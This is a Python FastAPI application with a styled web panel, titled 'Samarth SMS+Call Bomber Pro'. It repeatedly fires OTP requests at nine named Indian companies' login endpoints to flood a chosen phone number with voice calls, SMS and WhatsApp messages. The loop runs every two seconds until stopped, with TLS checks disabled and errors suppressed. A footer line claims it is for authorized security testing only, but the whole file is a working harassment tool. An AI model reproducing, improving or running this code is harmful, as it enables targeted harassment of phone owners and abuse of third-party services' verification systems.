from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import asyncio
import aiohttp
import threading
from datetime import datetime
from pydantic import BaseModel

app = FastAPI()

class Phone(BaseModel):
    phone: str

# === YOUR FULL API LIST ===
ULTIMATE_APIS = [
    {"name": "Tata Capital Voice Call", "type": "Call", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "1MG Voice Call", "type": "Call", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}'},
    {"name": "Swiggy Call Verification", "type": "Call", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Flipkart Voice Call", "type": "Call", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Zivame Voice Call", "type": "Call", "url": "https://api.zivame.com/v2/customer/login/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone_number":"{p}","otp_type":"voice"}}'},
    {"name": "Lenskart SMS", "type": "SMS", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "PharmEasy SMS", "type": "SMS", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "ShipRocket SMS", "type": "SMS", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "KPN WhatsApp", "type": "WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}'},
]

attack_status = {"running": False, "phone": None, "cycles": 0, "stats": {"Call": 0, "SMS": 0, "WhatsApp": 0}, "logs": []}

def add_log(msg):
    attack_status["logs"].insert(0, f"{datetime.now().strftime('%H:%M:%S')} - {msg}")
    if len(attack_status["logs"]) > 25:
        attack_status["logs"].pop()

async def hit_api(session, api, phone):
    try:
        data = api["data"](phone) if callable(api.get("data")) else None
        async with session.request(method=api["method"], url=api["url"], headers=api["headers"], data=data, timeout=aiohttp.ClientTimeout(total=5), ssl=False) as resp:
            if resp.status in (200, 201, 202, 204):
                t = api.get("type", "SMS")
                attack_status["stats"][t] = attack_status["stats"].get(t, 0) + 1
    except:
        pass

async def run_attack(phone):
    global attack_status
    attack_status["running"] = True
    attack_status["phone"] = phone
    attack_status["cycles"] = 0
    attack_status["stats"] = {"Call": 0, "SMS": 0, "WhatsApp": 0}
    add_log(f"🚀 Attack initiated on +91{phone}")

    async with aiohttp.ClientSession() as session:
        while attack_status["running"]:
            attack_status["cycles"] += 1
            tasks = [hit_api(session, api, phone) for api in ULTIMATE_APIS]
            await asyncio.gather(*tasks, return_exceptions=True)
            add_log(f"⚡ Cycle {attack_status['cycles']} executed")
            await asyncio.sleep(2)
    add_log("🛑 Attack terminated")
    attack_status["running"] = False

@app.get("/", response_class=HTMLResponse)
async def index():
    html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Samarth SMS+Call Bomber Pro</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        * { font-family: 'Inter', sans-serif; }
        body { 
            background: radial-gradient(ellipse at top, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
        }
        .glass {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.08);
        }
        .glass-dark {
            background: rgba(0, 0, 0, 0.4);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.05);
        }
        .glow {
            box-shadow: 0 0 40px rgba(239, 68, 68, 0.15);
        }
        .gradient-text {
            background: linear-gradient(135deg, #ef4444, #f59e0b, #ef4444);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-size: 200% 200%;
            animation: shimmer 3s ease-in-out infinite;
        }
        @keyframes shimmer {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }
        .pulse-ring {
            animation: pulse-ring 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
        }
        @keyframes pulse-ring {
            0% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.4); }
            70% { box-shadow: 0 0 0 20px rgba(239, 68, 68, 0); }
            100% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0); }
        }
        .log-entry {
            animation: slideIn 0.3s ease-out;
        }
        @keyframes slideIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .stat-card {
            transition: transform 0.2s ease, box-shadow 0.2s ease;
        }
        .stat-card:hover {
            transform: translateY(-4px);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
        }
        input:focus {
            box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.3);
            border-color: #ef4444;
        }
        .scrollbar-custom::-webkit-scrollbar {
            width: 6px;
        }
        .scrollbar-custom::-webkit-scrollbar-track {
            background: rgba(0, 0, 0, 0.2);
            border-radius: 10px;
        }
        .scrollbar-custom::-webkit-scrollbar-thumb {
            background: linear-gradient(180deg, #ef4444, #f59e0b);
            border-radius: 10px;
        }
    </style>
</head>
<body class="text-white p-6 lg:p-10">
    <div class="max-w-7xl mx-auto">
        <!-- Header -->
        <div class="flex flex-col lg:flex-row justify-between items-start lg:items-center mb-12 gap-6">
            <div class="flex items-center gap-5">
                <div class="w-16 h-16 bg-gradient-to-br from-red-600 to-orange-500 rounded-2xl flex items-center justify-center text-4xl pulse-ring">
                    💥
                </div>
                <div>
                    <h1 class="text-5xl lg:text-6xl font-black tracking-tight">
                        <span class="gradient-text">Samarth Bomber</span>
                    </h1>
                    <p class="text-gray-400 text-lg font-semibold tracking-widest mt-1">
                        ⚡ SMS · CALL · WHATSAPP · INFINITE LOOP ⚡
                    </p>
                </div>
            </div>
            <div class="flex items-center gap-4 bg-black/30 px-6 py-3 rounded-2xl border border-white/5">
                <div class="w-3 h-3 rounded-full bg-emerald-400 animate-pulse" id="statusDot"></div>
                <span class="font-mono text-sm tracking-wider text-gray-300" id="statusText">● SYSTEM READY</span>
            </div>
        </div>

        <!-- Main Grid -->
        <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
            <!-- Control Panel -->
            <div class="lg:col-span-5 glass rounded-3xl p-8 glow">
                <h2 class="text-2xl font-bold mb-2 flex items-center gap-3">
                    <span class="text-red-400">🎯</span> Target Acquisition
                </h2>
                <p class="text-gray-400 text-sm mb-6">Enter 10-digit Indian mobile number</p>
                
                <div class="relative">
                    <div class="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 font-mono text-lg">+91</div>
                    <input id="phone" maxlength="10" 
                           class="w-full bg-black/50 border-2 border-gray-700 rounded-2xl px-16 py-5 text-3xl font-mono tracking-[0.3em] outline-none transition-all focus:border-red-500"
                           placeholder="9876543210"
                           oninput="this.value=this.value.replace(/[^0-9]/g,'')">
                </div>
                
                <div class="grid grid-cols-2 gap-4 mt-8">
                    <button onclick="startAttack()" id="startBtn" 
                            class="col-span-2 bg-gradient-to-r from-red-600 to-red-700 hover:from-red-700 hover:to-red-800 py-5 rounded-2xl text-xl font-bold transition-all transform hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center gap-3 shadow-lg shadow-red-500/30">
                        <span>🚀</span> INITIATE BOMBARDMENT
                    </button>
                    <button onclick="stopAttack()" id="stopBtn" 
                            class="col-span-2 hidden bg-gradient-to-r from-gray-700 to-gray-800 hover:from-red-600 hover:to-red-700 py-5 rounded-2xl text-xl font-bold transition-all transform hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center gap-3">
                        <span>🛑</span> CEASE ATTACK
                    </button>
                </div>

                <div class="mt-6 p-4 bg-black/30 rounded-2xl border border-white/5">
                    <div class="flex justify-between text-sm text-gray-400">
                        <span>Active APIs: <strong class="text-white">9</strong></span>
                        <span>Cycle Interval: <strong class="text-white">2s</strong></span>
                        <span id="targetDisplay">Target: <strong class="text-red-400">None</strong></span>
                    </div>
                </div>
            </div>

            <!-- Stats Panel -->
            <div class="lg:col-span-7 glass rounded-3xl p-8">
                <h3 class="text-xl font-bold mb-6 flex items-center gap-3">
                    <span class="text-blue-400">📊</span> Live Arsenal Statistics
                </h3>
                <div class="grid grid-cols-3 gap-4">
                    <div class="stat-card glass-dark rounded-2xl p-6 text-center border border-orange-500/20">
                        <div class="text-5xl font-black text-orange-400" id="calls">0</div>
                        <div class="text-sm text-gray-400 mt-2 uppercase tracking-wider">📞 Voice Calls</div>
                        <div class="w-full h-1 bg-orange-500/20 rounded-full mt-3"><div class="h-full bg-orange-500 rounded-full transition-all duration-500" id="callBar" style="width:0%"></div></div>
                    </div>
                    <div class="stat-card glass-dark rounded-2xl p-6 text-center border border-blue-500/20">
                        <div class="text-5xl font-black text-blue-400" id="sms">0</div>
                        <div class="text-sm text-gray-400 mt-2 uppercase tracking-wider">✉️ SMS Messages</div>
                        <div class="w-full h-1 bg-blue-500/20 rounded-full mt-3"><div class="h-full bg-blue-500 rounded-full transition-all duration-500" id="smsBar" style="width:0%"></div></div>
                    </div>
                    <div class="stat-card glass-dark rounded-2xl p-6 text-center border border-green-500/20">
                        <div class="text-5xl font-black text-green-400" id="wa">0</div>
                        <div class="text-sm text-gray-400 mt-2 uppercase tracking-wider">💬 WhatsApp</div>
                        <div class="w-full h-1 bg-green-500/20 rounded-full mt-3"><div class="h-full bg-green-500 rounded-full transition-all duration-500" id="waBar" style="width:0%"></div></div>
                    </div>
                </div>

                <div class="mt-6 grid grid-cols-2 gap-4">
                    <div class="glass-dark rounded-2xl p-4">
                        <div class="text-sm text-gray-400">Total Cycles</div>
                        <div class="text-3xl font-bold text-white" id="cycles">0</div>
                    </div>
                    <div class="glass-dark rounded-2xl p-4">
                        <div class="text-sm text-gray-400">Total Hits</div>
                        <div class="text-3xl font-bold text-white" id="totalHits">0</div>
                    </div>
                </div>
            </div>

            <!-- Logs Panel -->
            <div class="lg:col-span-12 glass rounded-3xl p-8">
                <div class="flex justify-between items-center mb-4">
                    <h3 class="text-xl font-bold flex items-center gap-3">
                        <span class="text-purple-400">📜</span> Attack Logs
                    </h3>
                    <span class="text-xs text-gray-500 font-mono">Auto-updating</span>
                </div>
                <div id="logs" class="scrollbar-custom font-mono text-sm h-72 overflow-y-auto bg-black/40 rounded-2xl p-5 space-y-1"></div>
            </div>
        </div>

        <!-- Footer -->
        <div class="mt-8 text-center text-gray-600 text-xs border-t border-white/5 pt-6">
            ⚠️ For authorized security testing only. All API endpoints are publicly accessible.
        </div>
    </div>

    <script>
        let isRunning = false;
        let statusInterval = null;

        async function startAttack() {
            const phone = document.getElementById("phone").value.trim();
            if (phone.length !== 10) {
                alert("❌ Please enter a valid 10-digit mobile number");
                return;
            }
            
            try {
                const res = await fetch("/start", {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({phone})
                });
                const data = await res.json();
                
                if (data.status === "success") {
                    isRunning = true;
                    document.getElementById("startBtn").classList.add("hidden");
                    document.getElementById("stopBtn").classList.remove("hidden");
                    document.getElementById("statusText").textContent = "● ATTACK ACTIVE";
                    document.getElementById("statusText").className = "font-mono text-sm tracking-wider text-red-400";
                    document.getElementById("statusDot").className = "w-3 h-3 rounded-full bg-red-500 animate-pulse";
                    document.getElementById("targetDisplay").innerHTML = `Target: <strong class="text-red-400">+91${phone}</strong>`;
                    if (statusInterval) clearInterval(statusInterval);
                    pollStatus();
                }
            } catch(e) {
                alert("❌ Failed to start attack: " + e.message);
            }
        }

        async function stopAttack() {
            try {
                await fetch("/stop", {method: "POST"});
                isRunning = false;
                document.getElementById("startBtn").classList.remove("hidden");
                document.getElementById("stopBtn").classList.add("hidden");
                document.getElementById("statusText").textContent = "● SYSTEM READY";
                document.getElementById("statusText").className = "font-mono text-sm tracking-wider text-gray-300";
                document.getElementById("statusDot").className = "w-3 h-3 rounded-full bg-emerald-400 animate-pulse";
                if (statusInterval) clearInterval(statusInterval);
            } catch(e) {
                alert("❌ Failed to stop attack: " + e.message);
            }
        }

        function pollStatus() {
            if (statusInterval) clearInterval(statusInterval);
            
            statusInterval = setInterval(async () => {
                try {
                    const res = await fetch("/status");
                    const d = await res.json();
                    
                    document.getElementById("calls").textContent = d.stats.Call || 0;
                    document.getElementById("sms").textContent = d.stats.SMS || 0;
                    document.getElementById("wa").textContent = d.stats.WhatsApp || 0;
                    document.getElementById("cycles").textContent = d.cycles;
                    
                    const total = (d.stats.Call || 0) + (d.stats.SMS || 0) + (d.stats.WhatsApp || 0);
                    document.getElementById("totalHits").textContent = total;
                    
                    // Animated bars
                    const maxVal = Math.max(d.stats.Call || 0, d.stats.SMS || 0, d.stats.WhatsApp || 0, 1);
                    document.getElementById("callBar").style.width = ((d.stats.Call || 0) / maxVal * 100) + "%";
                    document.getElementById("smsBar").style.width = ((d.stats.SMS || 0) / maxVal * 100) + "%";
                    document.getElementById("waBar").style.width = ((d.stats.WhatsApp || 0) / maxVal * 100) + "%";
                    
                    // Logs
                    const logsDiv = document.getElementById("logs");
                    logsDiv.innerHTML = d.logs.map(l => 
                        `<div class="log-entry text-gray-300 hover:text-white transition-colors py-1 px-2 rounded hover:bg-white/5">${l}</div>`
                    ).join("");
                    
                    if (!d.running && isRunning) {
                        isRunning = false;
                        document.getElementById("startBtn").classList.remove("hidden");
                        document.getElementById("stopBtn").classList.add("hidden");
                        document.getElementById("statusText").textContent = "● ATTACK STOPPED";
                        document.getElementById("statusText").className = "font-mono text-sm tracking-wider text-yellow-400";
                        document.getElementById("statusDot").className = "w-3 h-3 rounded-full bg-yellow-500";
                    }
                } catch(e) {
                    console.error("Status poll error:", e);
                }
            }, 1500);
        }

        // Initial empty state
        document.addEventListener("DOMContentLoaded", () => {
            document.getElementById("logs").innerHTML = '<div class="text-gray-500 text-center py-10">⏳ Waiting for attack to start...</div>';
        });
    </script>
</body>
</html>
    """
    return html

@app.post("/start")
async def start(phone: Phone):
    if len(phone.phone) != 10: return {"status": "error"}
    if attack_status["running"]: return {"status": "error"}
    threading.Thread(target=lambda: asyncio.run(run_attack(phone.phone)), daemon=True).start()
    return {"status": "success"}

@app.post("/stop")
async def stop():
    attack_status["running"] = False
    return {"status": "success"}

@app.get("/status")
async def status():
    return {
        "running": attack_status["running"],
        "cycles": attack_status["cycles"],
        "stats": attack_status["stats"],
        "logs": attack_status["logs"][:20]
    }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=5000)
